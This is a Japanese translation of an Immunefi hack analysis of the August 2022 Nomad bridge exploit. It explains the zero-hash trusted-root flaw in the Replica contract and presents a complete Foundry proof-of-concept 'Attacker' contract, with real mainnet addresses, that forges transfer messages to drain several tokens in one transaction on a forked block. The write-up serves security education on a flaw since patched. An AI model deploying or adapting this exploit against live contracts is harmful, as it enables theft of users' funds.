# オンチェーン・トランザクションのデバッグ：7. ハッキング分析：Nomad Bridge (2022/08)

著者: [gmhacker.eth](https://twitter.com/realgmhacker)

翻訳: [「」](https://x.com/yuu11111_?s=21)

## はじめに

Nomad ブリッジは 2022 年 8 月 1 日にハッキングされ、ロックされていた資金 1 億 9,000 万ドルが流出しました。最初の攻撃者が脆弱性を悪用して成功を収めた後、他の“ダークフォレスト”の住人たち（暗号資産の世界で機会を伺う者たち）も便乗してエクスプロイトを再現し、最終的に「クラウドソース型」の大規模なハッキングへと発展しました。

Nomad のプロキシ契約（コントラクト）の実装における定例のアップグレードにおいて、ゼロハッシュ値が信頼できるルートとしてマークされたことで、メッセージが自動的に承認されるようになりました。ハッカーはこの脆弱性を利用してブリッジコントラクトを偽装し、資金のロック解除を不正に実行させました。

[こちら](https://dashboard.tenderly.co/tx/mainnet/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460)で確認できる最初の成功したトランザクションだけで、ブリッジから 100 WBTC（当時約 230 万ドル）が流出しました。フラッシュローンや他の DeFi プロトコルとの複雑な連携は一切必要ありませんでした。攻撃は単に、適切なメッセージ入力を用いてコントラクトの関数を呼び出すだけで、攻撃者はプロトコルの流動性から次々と資金を奪い続けました。

残念なことに、トランザクションが単純で再現可能であったため、他の人々も不正な利益の一部を手に入れました。[Rekt News](https://rekt.news/nomad-rekt/)が報じたように、「DeFi の原則に忠実に、このハッキングはパーミッションレス（誰でも参加可能）だった」。

この記事では、Nomad ブリッジの Replica コントラクトで悪用された脆弱性を分析し、その後、ローカルフォークに対してテストすることで、1 回のトランザクションで全ての流動性を流出させる独自の攻撃バージョンを作成します。完全な PoC（Proof of Concept）は[こちら](https://github.com/immunefi-team/hack-analysis-pocs/tree/main/src/nomad-august-2022)で確認できます。

この記事は、Immunefi のスマートコントラクトトリアージャーである[gmhacker.eth](https://twitter.com/realgmhacker)によって執筆されました。

## 背景

Nomad はクロスチェーン通信プロトコルであり、特にイーサリアム、Moonbeam、およびその他のチェーン間でトークンをブリッジすることを可能にします。Nomad コントラクトに送信されたメッセージは、オプティミスティック検証メカニズムに従って、オフチェーンのエージェントを通じて検証され、他のチェーンに転送されます。

ほとんどのクロスチェーンブリッジングプロトコルと同様に、Nomad のトークンブリッジは、一方の側でトークンをロックし、もう一方の側で代表トークンをミントするプロセスによって、異なるチェーン間で価値を転送することができます。これらの代表トークンは最終的に焼却（バーン）されて元の資金をロック解除できる（つまり、トークンのネイティブチェーンに戻す）ため、IOU（借用証書）として機能し、元の ERC-20 と同じ経済的価値を持ちます。このブリッジの一般的な側面が、複雑なスマートコントラクト内に大量の資金が蓄積される原因となり、ハッカーにとって非常に魅力的な標的となります。

<div align=center>
<img src="https://user-images.githubusercontent.com/107821372/217752487-9580592c-98ed-4690-b330-d211d795d276.png" alt="Cover" width="80%"/>
</div>

ロック＆ミントのプロセス、出典: [MakerDAO のブログ](https://blog.makerdao.com/what-are-blockchain-bridges-and-why-are-they-important-for-defi/)

Nomad の場合、全てのサポートされているチェーンにデプロイされている`Replica`と呼ばれるコントラクトが、Merkle ツリー構造でメッセージを検証する役割を担っています。プロトコル内の他のコントラクトは、インバウンドメッセージの認証のためにこれに依存しています。メッセージが検証されると、それは Merkle ツリーに保存され、新しいコミットされたツリーのルートが生成され、処理が承認されます。

## 根本原因

Nomad ブリッジがどのようなものであるかを大まかに理解したところで、2022 年 8 月のハッキングで悪用された根本原因の脆弱性を探るために、実際のスマートコントラクトコードを掘り下げていきます。そのためには、`Replica`コントラクトをさらに深く見ていく必要があります。

```
   function process(bytes memory _message) public returns (bool _success) {
       // ensure message was meant for this domain
       bytes29 _m = _message.ref(0);
       require(_m.destination() == localDomain, "!destination");
       // ensure message has been proven
       bytes32 _messageHash = _m.keccak();
       require(acceptableRoot(messages[_messageHash]), "!proven");
       // check re-entrancy guard
       require(entered == 1, "!reentrant");
       entered = 0;
       // update message status as processed
       messages[_messageHash] = LEGACY_STATUS_PROCESSED;
       // call handle function
       IMessageRecipient(_m.recipientAddress()).handle(
           _m.origin(),
           _m.nonce(),
           _m.sender(),
           _m.body().clone()
       );
       // emit process results
       emit Process(_messageHash, true, "");
       // reset re-entrancy guard
       entered = 1;
       // return true
       return true;
   }
```

<div align=center>

スニペット 1: Replica.sol の `process` 関数、[元のコード](https://gist.github.com/gists-immunefi/f8ef00be9e1c5dd4d879a418966191e0#file-nomad-hack-analysis-1-sol)。

</div>

`Replica`コントラクトの`process`[関数](https://etherscan.io/address/0xb92336759618f55bd0f8313bd843604592e27bd8#code%23F1%23L179)は、メッセージを最終的な受信者にディスパッチする役割を担っています。これは、入力メッセージがすでに証明されている場合、つまりメッセージがすでに Merkle ツリーに追加され、承認された信頼できるルートにつながっている場合にのみ成功します。このチェックは、メッセージハッシュに対して、`acceptableRoot`ビュー関数を使用して行われます。この関数は、確認されたルートマッピングから読み取ります。

```
   function initialize(
       uint32 _remoteDomain,
       address _updater,
       bytes32 _committedRoot,
       uint256 _optimisticSeconds
   ) public initializer {
       __NomadBase_initialize(_updater);
       // set storage variables
       entered = 1;
       remoteDomain = _remoteDomain;
       committedRoot = _committedRoot;
       // pre-approve the committed root.
       confirmAt[_committedRoot] = 1;
       _setOptimisticTimeout(_optimisticSeconds);
   }
```

<div align=center>

スニペット 2: Replica.sol の `initialize` 関数、[元のコード](https://gist.github.com/gists-immunefi/4792c4bb10d3f73648b4b0f86e564ac9#file-nomad-hack-analysis-2-sol)。

</div>

あるプロキシコントラクトの実装でアップグレードが行われると、アップグレードロジックは一度だけ呼び出される初期化関数を実行する場合があります。この関数は、いくつかの初期状態値を設定します。特に、[4 月 21 日のアップグレード](https://openchain.xyz/trace/ethereum/0x99662dacfb4b963479b159fc43c2b4d048562104fe154a4d0c2519ada72e50bf)では、事前に承認されたコミット済みルートとして 0x00 が渡され、それが`confirmAt`マッピングに保存されました。ここに脆弱性が現れました。

`process()`関数に戻ると、`messages`マッピング上のメッセージハッシュをチェックすることに依存していることがわかります。このマッピングは、メッセージを処理済みとしてマークする役割を担っており、攻撃者が同じメッセージをリプレイできないようにしています。

EVM スマートコントラクトのストレージの特殊な側面として、すべてのスロットが実質的にゼロ値で初期化されるという点があります。つまり、ストレージ内の未使用のスロットを読み取っても、例外は発生せず、0x00 が返されます。このことから、Solidity マッピング上の未使用のキーはすべて 0x00 を返すという結論が導き出されます。このロジックに従い、メッセージハッシュが`messages`マッピングに存在しない場合、0x00 が返され、それが`acceptableRoot`関数に渡されます。そして、0x00 が信頼されたルートとして設定されているため、この関数は true を返します。メッセージは処理済みとしてマークされますが、誰でも簡単にメッセージを変更して新しい未使用のメッセージを作成し、再送信することができます。

入力メッセージは、特定の形式で様々なパラメータをエンコードします。その中で、ブリッジから資金をロック解除するメッセージには、受信者のアドレスが含まれています。そのため、最初の攻撃者が[成功したトランザクション](https://dashboard.tenderly.co/tx/mainnet/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460)を実行した後、メッセージ形式をデコードする方法を知っている人なら誰でも、単に受信者アドレスを変更して攻撃トランザクションをリプレイするだけで、今度は新しいアドレスに利益をもたらす異なるメッセージで攻撃を仕掛けることができました。

## Proof of Concept

Nomad プロトコルを危険にさらした脆弱性を理解したところで、独自の概念実証（PoC）を構築できます。`Replica`関数の`process`関数を、流出させたい特定のトークンごとに一度呼び出すための特定のメッセージを作成し、単一のトランザクションでプロトコルを破綻させます。

まず、アーカイブアクセスが可能な RPC プロバイダーを選択します。このデモンストレーションでは、Ankr が提供する[無料のパブリック RPC アグリゲーター](https://www.ankr.com/rpc/eth/)を使用します。フォークブロックとして、最初のハッキングトランザクションの 1 ブロック前であるブロック番号 15259100 を選択します。

私たちの PoC は、成功するために 1 回のトランザクションでいくつかのステップを実行する必要があります。以下は、攻撃 PoC で実装する内容の概要です。

1.  特定の ERC-20 トークンを選択し、Nomad ERC-20 ブリッジコントラクトの残高を確認します。
2.  資金をロック解除するための正しいパラメータ（受取人として攻撃者のアドレス、ロック解除する資金の全トークン残高など）を含むメッセージペイロードを生成します。
3.  脆弱な`process`関数を呼び出し、これによりトークンが受取人アドレスに転送されます。
4.  ブリッジ残高に重要な存在を持つ様々な ERC-20 トークンをループ処理し、同様の方法でそれらの資金を流出させます。

段階的にコードを記述し、最終的に PoC 全体がどのように見えるかを確認します。Foundry を使用します。

## 攻撃

```
pragma solidity ^0.8.13;

import "@openzeppelin/token/ERC20/ERC20.sol";

interface IReplica {
   function process(bytes memory _message) external returns (bool _success);
}

contract Attacker {
   address constant REPLICA = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
   address constant ERC20_BRIDGE = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;

   // tokens
   address [] public tokens = [
       0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
       0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
       0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
       0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
       0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
       0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0, // FRAX
       0xD417144312DbF50465b1C641d016962017Ef6240  // CQT
   ];

   function attack() external {
       for (uint i = 0; i < tokens.length; i++) {
           address token = tokens[i];
           uint256 amount_bridge = IERC20(token).balanceOf(ERC20_BRIDGE);

           bytes memory payload = genPayload(msg.sender, token, amount_bridge);
           bool success = IReplica(REPLICA).process(payload);
           require(success, "Failed to process the payload");
       }
   }

   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory) {}
}
```

<div align=center>

スニペット 3: 攻撃コントラクトの開始部分、[元のコード](https://gist.github.com/gists-immunefi/4305df38623ddcaa11812a9c186c73ac#file-nomad-hack-analysis-3-sol)。

</div>

まず、`Attacker`コントラクトを作成します。コントラクトへのエントリーポイントは`attack`関数で、これは様々なトークンアドレスをループする単純な`for`ループです。ここでは、処理対象の特定のトークンに対する`ERC20_BRIDGE`（イーサリアム上でロックされた資金を保持する Nomad ERC-20 ブリッジコントラクトのアドレス）の残高を確認します。

その後、悪意のあるメッセージペイロードが生成されます。各ループイテレーションで変更されるパラメータは、トークンアドレスと転送される資金の量です。生成されたメッセージは、`IReplica.process`関数への入力となります。すでに確立したように、この関数はエンコードされたメッセージを Nomad プロトコル上の正しいエンドコントラクトに転送し、ロック解除と転送リクエストを実現させ、効果的にブリッジロジックをだまします。

```

contract Attacker {
   address constant BRIDGE_ROUTER = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;

   // Nomad domain IDs
   uint32 constant ETHEREUM = 0x657468;   // "eth"
   uint32 constant MOONBEAM = 0x6265616d; // "beam"

   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory payload) {
       payload = abi.encodePacked(
           MOONBEAM,                           // Home chain domain
           uint256(uint160(BRIDGE_ROUTER)),    // Sender: bridge
           uint32(0),                          // Dst nonce
           ETHEREUM,                           // Dst chain domain
           uint256(uint160(ERC20_BRIDGE)),     // Recipient (Nomad ERC20 bridge)
           ETHEREUM,                           // Token domain
           uint256(uint160(token)),            // token id (e.g. WBTC)
           uint8(0x3),                         // Type - transfer
           uint256(uint160(recipient)),        // Recipient of the transfer
           uint256(amount),                    // Amount
           uint256(0)                          // Optional: Token details hash
                                               // keccak256(
                                               //     abi.encodePacked(
                                               //         bytes(tokenName).length,
                                               //         tokenName,
                                               //         bytes(tokenSymbol).length,
                                               //         tokenSymbol,
                                               //         tokenDecimals
                                               //     )
                                               // )
       );
   }
}
```

<div align=center>

スニペット 4: 正しい形式とパラメータで悪意のあるメッセージを生成する、[元のコード](https://gist.github.com/gists-immunefi/2a5fbe2e6034dd30534bdd4433b52a29#file-nomad-hack-analysis-4-sol)。

</div>

生成されるメッセージは、プロトコルによって適切に解凍されるように、様々なパラメータでエンコードされる必要があります。重要なのは、メッセージの転送経路（ブリッジルーターと ERC-20 ブリッジのアドレス）を指定する必要があることです。また、メッセージをトークン転送としてフラグ付けする必要があるため、タイプとして`0x3`の値を指定します。

最後に、私たちに利益をもたらすパラメータ、つまり正しいトークンアドレス、転送する金額、そしてその転送の受取人を指定する必要があります。すでに述べたように、これにより`Replica`コントラクトによって処理されたことのない全く新しいオリジナルのメッセージが確実に作成され、以前の説明に従って、それは実際に有効であるとみなされます。

驚くべきことに、これでエクスプロイトロジック全体が完成します。Foundry のログを含めても、私たちの PoC はわずか 87 行のコードに過ぎません。

フォークされたブロック番号に対してこの PoC を実行すると、以下の利益が得られます。

- 1,028 WBTC
- 22,876 WETH
- 87,459,362 USDC
- 8,625,217 USDT
- 4,533,633 DAI
- 119,088 FXS
- 113,403,733 CQT

## 結論

Nomad ブリッジの悪用は、2022 年最大のハッキングの一つでした。この攻撃は、プロトコル全体におけるセキュリティの重要性を強調しています。この特定の場合では、プロキシの実装におけるたった 1 回のアップグレードが、いかにして重大な脆弱性を引き起こし、ロックされたすべての資金を危険にさらす可能性があるかを学びました。さらに、開発時には、ストレージスロットの 0x00 のデフォルト値、特にマッピングを含むロジックに関して注意を払う必要があります。また、このような一般的な脆弱性につながる可能性のある値に対して、いくつかの単体テストを設定しておくことも良いことです。

資金の一部を流出させた一部のスカベンジャー（漁り屋）アカウントが資金をプロトコルに返還したことに留意すべきです。ブリッジを再開する[計画](https://medium.com/nomad-xyz-blog/nomad-bridge-relaunch-guide-3a4ef6624f90)があり、返還された資産は、回収された資金の比例配分によってユーザーに分配される予定です。盗まれた資金は、Nomad の[リカバリーウォレット](https://etherscan.io/address/0x94a84433101a10aeda762968f6995c574d1bf154)に返還することができます。

以前に指摘したように、この PoC は実際にハッキングを強化し、1 回のトランザクションで全ての TVL（Total Value Locked：ロックされた総価値）を流出させます。これは実際に発生した攻撃よりも単純な攻撃です。Foundry の便利なログを追加した PoC 全体は次のようになります。

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/token/ERC20/ERC20.sol";
import "forge-std/console.sol";

interface IReplica {
   function process(bytes memory _message) external returns (bool _success);
}

contract Attacker {
   address constant REPLICA = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
   address constant BRIDGE_ROUTER = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;
   address constant ERC20_BRIDGE = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;

   // Nomad domain IDs
   uint32 constant ETHEREUM = 0x657468;   // "eth"
   uint32 constant MOONBEAM = 0x6265616d; // "beam"

   // tokens
   address [] public tokens = [
       0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
       0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
       0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
       0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
       0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
       0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0, // FRAX
       0xD417144312DbF50465b1C641d016962017Ef6240  // CQT
   ];

   function attack() external {
       for (uint i = 0; i < tokens.length; i++) {
           address token = tokens[i];
           uint256 amount_bridge = ERC20(token).balanceOf(ERC20_BRIDGE);

           console.log(
               "[*] Stealing",
               amount_bridge / 10**ERC20(token).decimals(),
               ERC20(token).symbol()
           );
           console.log(
               "    Attacker balance before:",
               ERC20(token).balanceOf(msg.sender)
           );

           // Generate the payload with all of the tokens stored on the bridge
           bytes memory payload = genPayload(msg.sender, token, amount_bridge);

           bool success = IReplica(REPLICA).process(payload);
           require(success, "Failed to process the payload");

           console.log(
               "    Attacker balance after: ",
               IERC20(token).balanceOf(msg.sender) / 10**ERC20(token).decimals()
           );
       }
   }

   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory payload) {
       payload = abi.encodePacked(
           MOONBEAM,                           // Home chain domain
           uint256(uint160(BRIDGE_ROUTER)),    // Sender: bridge
           uint32(0),                          // Dst nonce
           ETHEREUM,                           // Dst chain domain
           uint256(uint160(ERC20_BRIDGE)),     // Recipient (Nomad ERC20 bridge)
           ETHEREUM,                           // Token domain
           uint256(uint160(token)),          // token id (e.g. WBTC)
           uint8(0x3),                         // Type - transfer
           uint256(uint160(recipient)),      // Recipient of the transfer
           uint256(amount),                  // Amount
           uint256(0)                          // Optional: Token details hash
                                               // keccak256(
                                               //     abi.encodePacked(
                                               //         bytes(tokenName).length,
                                               //         tokenName,
                                               //         bytes(tokenSymbol).length,
                                               //         tokenSymbol,
                                               //         tokenDecimals
                                               //     )
                                               // )
       );
   }
}
```

<div align=center>

スニペット 5: 全てのコード、[元のコード](https://gist.github.com/gists-immunefi/2bdffe6f9683c9b3ab810e1fb7fe4aff#file-nomad-hack-analysis-5-sol)。

</div>
